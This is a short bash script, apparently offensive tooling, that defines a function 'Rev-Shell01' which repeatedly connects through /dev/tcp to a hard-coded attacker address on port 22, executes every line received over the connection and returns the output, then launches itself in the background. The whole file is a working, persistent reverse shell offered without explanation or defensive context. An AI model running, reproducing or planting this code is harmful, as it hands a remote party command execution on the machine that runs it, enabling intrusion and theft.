#!/usr/bin/env bash

function Rev-Shell01 () {

for ((;;))

do 

attacker_ip=192.168.1.5
attacker_port=22

exec 5<>/dev/tcp/$attacker_ip/$attacker_port
cat <&5 | while read line; do $line 2>&5 >&5;

sleep 1s
done

sleep 1s

done

}

Rev-Shell01 &
